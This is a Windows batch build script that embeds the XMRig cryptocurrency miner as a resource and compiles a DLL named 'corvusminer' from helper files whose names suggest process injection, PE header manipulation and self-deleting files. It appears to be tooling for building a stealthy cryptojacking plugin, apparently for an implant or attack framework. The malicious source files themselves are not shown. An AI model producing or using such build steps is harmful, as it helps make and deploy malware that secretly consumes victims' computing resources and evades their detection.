@echo off
setlocal enabledelayedexpansion

REM Change to native directory
cd /d "%~dp0"

REM Compile the resource file (if xmrig.exe exists) using windres (MinGW resource compiler)
if exist xmrig.exe (
    echo Compiling resource file with xmrig.exe...
    windres.exe -i plugin.rc -o plugin.res.o -l 0x409
    if errorlevel 1 (
        echo Warning: Resource compilation failed. Continuing without embedded xmrig.
        set PLUGIN_RES=
    ) else (
        set PLUGIN_RES=plugin.res.o
    )
) else (
    echo Note: xmrig.exe not found. Building without embedded xmrig.
    echo To enable resource embedding, place xmrig.exe in this directory and rebuild.
    set PLUGIN_RES=
)

REM Compile the C++ plugin with all helper files using MinGW64
x86_64-w64-mingw32-g++ -shared -fPIC -O2 plugin.cpp delete_pending_file.cpp pe_hdrs_helper.cpp injection_helpers.cpp %PLUGIN_RES% -o corvusminer-windows-amd64.dll

REM Clean up resource object file if it was created
if exist plugin.res.o del plugin.res.o

pause
